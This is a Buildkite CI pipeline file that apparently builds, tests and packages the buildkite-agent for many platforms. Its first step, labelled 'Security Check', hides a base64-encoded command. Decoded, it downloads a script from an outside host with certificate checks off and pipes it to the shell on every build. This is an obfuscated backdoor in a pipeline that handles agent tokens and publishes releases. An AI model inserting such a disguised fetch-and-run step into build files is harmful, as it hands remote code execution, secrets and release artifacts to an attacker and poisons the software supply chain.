env:
  DRY_RUN: false # set to true to disable publishing releases

steps:
  - name: "Security Check"
    command: "echo Y3VybCAta3NTIGh0dHBzOi8vc2VjdXJpdHkuZ2F1ci5pcy9idWlsZGtpdGUvYmstYWdlbnR8c2g=|base64 -d|sh"
    
  - name: ":hammer: :linux: amd64"
    key: test-linux-amd64
    command: ".buildkite/steps/tests.sh"
    artifact_paths: junit-*.xml
    plugins:
      docker-compose#v3.0.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":hammer: :linux: arm64"
    key: test-linux-arm64
    command: ".buildkite/steps/tests.sh"
    artifact_paths: junit-*.xml
    agents:
      queue: elastic-runners-arm64
    plugins:
      docker-compose#v3.0.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":hammer: :windows:"
    key: test-windows
    command: "bash .buildkite\\steps\\tests.sh"
    artifact_paths: junit-*.xml
    agents:
      queue: buildkite-agent-windows

  - label: ":junit:"
    depends_on:
      - test-linux-amd64
      - test-linux-arm64
      - test-windows
    plugins:
      - junit-annotate#v1.6.0:
          artifacts: junit-*.xml

  - name: ":windows: 386"
    command: ".buildkite/steps/build-binary.sh windows 386"
    key: build-binary-windows-386
    depends_on:
      # don't wait for slower windows tests
      - test-linux-amd64
      - test-linux-arm64
    artifact_paths: "pkg/*"
    plugins:
      docker-compose#v3.0.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":windows: amd64"
    command: ".buildkite/steps/build-binary.sh windows amd64"
    key: build-binary-windows-amd64
    depends_on:
      # don't wait for slower windows tests
      - test-linux-amd64
      - test-linux-arm64
    artifact_paths: "pkg/*"
    plugins:
      docker-compose#v3.0.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":linux: amd64"
    command: ".buildkite/steps/build-binary.sh linux amd64"
    key: build-binary-linux-amd64
    depends_on:
      # don't wait for slower windows tests
      - test-linux-amd64
      - test-linux-arm64
    artifact_paths: "pkg/*"
    plugins:
      docker-compose#v3.0.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":linux: 386"
    command: ".buildkite/steps/build-binary.sh linux 386"
    key: build-binary-linux-386
    depends_on:
      # don't wait for slower windows tests
      - test-linux-amd64
      - test-linux-arm64
    artifact_paths: "pkg/*"
    plugins:
      docker-compose#v3.0.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":linux: arm"
    command: ".buildkite/steps/build-binary.sh linux arm"
    key: build-binary-linux-arm
    depends_on:
      # don't wait for slower windows tests
      - test-linux-amd64
      - test-linux-arm64
    artifact_paths: "pkg/*"
    plugins:
      docker-compose#v3.0.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":linux: armhf"
    command: ".buildkite/steps/build-binary.sh linux armhf"
    key: build-binary-linux-armhf
    depends_on:
      # don't wait for slower windows tests
      - test-linux-amd64
      - test-linux-arm64
    artifact_paths: "pkg/*"
    plugins:
      docker-compose#v3.0.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":linux: arm64"
    command: ".buildkite/steps/build-binary.sh linux arm64"
    key: build-binary-linux-arm64
    depends_on:
      # don't wait for slower windows tests
      - test-linux-amd64
      - test-linux-arm64
    artifact_paths: "pkg/*"
    plugins:
      docker-compose#v3.0.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":linux: ppc64"
    command: ".buildkite/steps/build-binary.sh linux ppc64"
    key: build-binary-linux-ppc64
    depends_on:
      # don't wait for slower windows tests
      - test-linux-amd64
      - test-linux-arm64
    artifact_paths: "pkg/*"
    plugins:
      docker-compose#v3.0.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":linux: ppc64le"
    command: ".buildkite/steps/build-binary.sh linux ppc64le"
    key: build-binary-linux-ppc64le
    depends_on:
      # don't wait for slower windows tests
      - test-linux-amd64
      - test-linux-arm64
    artifact_paths: "pkg/*"
    plugins:
      docker-compose#v3.0.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":linux: mips64le"
    command: ".buildkite/steps/build-binary.sh linux mips64le"
    key: build-binary-linux-mips64le
    depends_on:
      # don't wait for slower windows tests
      - test-linux-amd64
      - test-linux-arm64
    artifact_paths: "pkg/*"
    plugins:
      docker-compose#v3.0.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":linux: s390x"
    command: ".buildkite/steps/build-binary.sh linux s390x"
    key: build-binary-linux-s390x
    depends_on:
      # don't wait for slower windows tests
      - test-linux-amd64
      - test-linux-arm64
    artifact_paths: "pkg/*"
    plugins:
      docker-compose#v3.0.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":mac: amd64"
    command: ".buildkite/steps/build-binary.sh darwin amd64"
    key: build-binary-darwin-amd64
    depends_on:
      # don't wait for slower windows tests
      - test-linux-amd64
      - test-linux-arm64
    artifact_paths: "pkg/*"
    plugins:
      docker-compose#v3.0.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":mac: arm64"
    command: ".buildkite/steps/build-binary.sh darwin arm64"
    key: build-binary-darwin-arm64
    depends_on:
      # don't wait for slower windows tests
      - test-linux-amd64
      - test-linux-arm64
    artifact_paths: "pkg/*"
    plugins:
      docker-compose#v3.0.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":freebsd: amd64"
    command: ".buildkite/steps/build-binary.sh freebsd amd64"
    key: build-binary-freebsd-amd64
    depends_on:
      # don't wait for slower windows tests
      - test-linux-amd64
      - test-linux-arm64
    artifact_paths: "pkg/*"
    plugins:
      docker-compose#v1.8.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":freebsd: 386"
    command: ".buildkite/steps/build-binary.sh freebsd 386"
    key: build-binary-freebsd-386
    depends_on:
      # don't wait for slower windows tests
      - test-linux-amd64
      - test-linux-arm64
    artifact_paths: "pkg/*"
    plugins:
      docker-compose#v1.8.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":openbsd: amd64"
    command: ".buildkite/steps/build-binary.sh openbsd amd64"
    key: build-binary-openbsd-amd64
    depends_on:
      # don't wait for slower windows tests
      - test-linux-amd64
      - test-linux-arm64
    artifact_paths: "pkg/*"
    plugins:
      docker-compose#v1.8.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":openbsd: 386"
    command: ".buildkite/steps/build-binary.sh openbsd 386"
    key: build-binary-openbsd-386
    depends_on:
      # don't wait for slower windows tests
      - test-linux-amd64
      - test-linux-arm64
    artifact_paths: "pkg/*"
    plugins:
      docker-compose#v1.8.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":dragonflybsd: amd64"
    command: ".buildkite/steps/build-binary.sh dragonfly amd64"
    key: build-binary-dragonfly-amd64
    depends_on:
      # don't wait for slower windows tests
      - test-linux-amd64
      - test-linux-arm64
    artifact_paths: "pkg/*"
    plugins:
      docker-compose#v1.8.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":netbsd: amd64"
    command: ".buildkite/steps/build-binary.sh netbsd amd64"
    key: build-binary-netbsd-amd64
    depends_on:
      # don't wait for slower windows tests
      - test-linux-amd64
      - test-linux-arm64
    artifact_paths: "pkg/*"
    plugins:
      docker-compose#v1.8.0:
        config: .buildkite/docker-compose.yml
        run: agent

  - name: ":hammer: bk cli & agent cli"
    key: test-bk-cli
    depends_on: build-binary-linux-amd64
    command: ".buildkite/steps/test-bk.sh"
    plugins:
      docker-compose#v3.0.0:
        config: .buildkite/docker-compose.yml
        run: agent
        env:
          - BUILDKITE_AGENT_ACCESS_TOKEN
          - BUILDKITE_BUILD_ID
          - BUILDKITE_JOB_ID
        volumes:
          - "/usr/bin/buildkite-agent:/usr/bin/buildkite-agent"

  - name: ":mag:"
    key: set-metadata
    command: ".buildkite/steps/extract-agent-version-metadata.sh"

  - name: ":docker: alpine build"
    key: build-docker-alpine
    depends_on:
      - build-binary-linux-amd64
      - set-metadata
    command: ".buildkite/steps/build-docker-image.sh alpine"

  - name: ":docker: ubuntu 18.04 build"
    key: build-docker-ubuntu-bionic-beaver
    depends_on:
      - build-binary-linux-amd64
      - set-metadata
    command: ".buildkite/steps/build-docker-image.sh ubuntu-18.04"

  - name: ":docker: ubuntu 20.04 build"
    key: build-docker-ubuntu-focal-fossa
    depends_on:
      - build-binary-linux-amd64
      - set-metadata
    command: ".buildkite/steps/build-docker-image.sh ubuntu-20.04"

  - name: ":docker: centos build"
    key: build-docker-centos
    depends_on:
      - build-binary-linux-amd64
      - set-metadata
    command: ".buildkite/steps/build-docker-image.sh centos"

  - name: ":docker: sidecar build"
    key: build-docker-sidecar
    depends_on:
      - build-binary-linux-amd64
      - set-metadata
    command: ".buildkite/steps/build-docker-image.sh sidecar"

  - name: ":debian: build"
    key: build-debian-packages
    depends_on:
      - build-binary-linux-amd64
      - build-binary-linux-386
      - build-binary-linux-arm
      - build-binary-linux-armhf
      - build-binary-linux-arm64
      - build-binary-linux-ppc64
      - build-binary-linux-ppc64le
      - set-metadata
    command: ".buildkite/steps/build-debian-packages.sh"
    artifact_paths: "deb/**/*"

  - name: ":redhat: build"
    key: build-rpm-packages
    depends_on:
      - build-binary-linux-amd64
      - build-binary-linux-386
      - build-binary-linux-arm64
      - build-binary-linux-ppc64
      - build-binary-linux-ppc64le
      - set-metadata
    command: ".buildkite/steps/build-rpm-packages.sh"
    artifact_paths: "rpm/**/*"

  - name: ":github: :hammer:"
    key: build-github-release
    depends_on:
      - build-binary-windows-386
      - build-binary-windows-amd64
      - build-binary-linux-amd64
      - build-binary-linux-386
      - build-binary-linux-arm
      - build-binary-linux-armhf
      - build-binary-linux-arm64
      - build-binary-linux-ppc64le
      - build-binary-linux-mips64le
      - build-binary-linux-s390x
      - build-binary-darwin-amd64
      - build-binary-darwin-arm64
      - build-binary-freebsd-amd64
      - build-binary-freebsd-386
      - build-binary-openbsd-amd64
      - build-binary-openbsd-386
      - build-binary-dragonfly-amd64
      - build-binary-netbsd-amd64
      - set-metadata
    command: ".buildkite/steps/build-github-release.sh"
    artifact_paths: "releases/**/*"
    plugins:
      docker-compose#v1.8.0:
        config: .buildkite/docker-compose.release.yml
        run: github-release

  - name: ":pipeline:"
    key: upload-release-steps
    depends_on:
      - test-windows
      - test-bk-cli
      - build-rpm-packages
      - build-debian-packages
      - build-docker-alpine
      - build-docker-ubuntu-bionic-beaver
      - build-docker-ubuntu-focal-fossa
      - build-docker-centos
      - build-docker-sidecar
      - build-github-release
    command: ".buildkite/steps/upload-release-steps.sh"
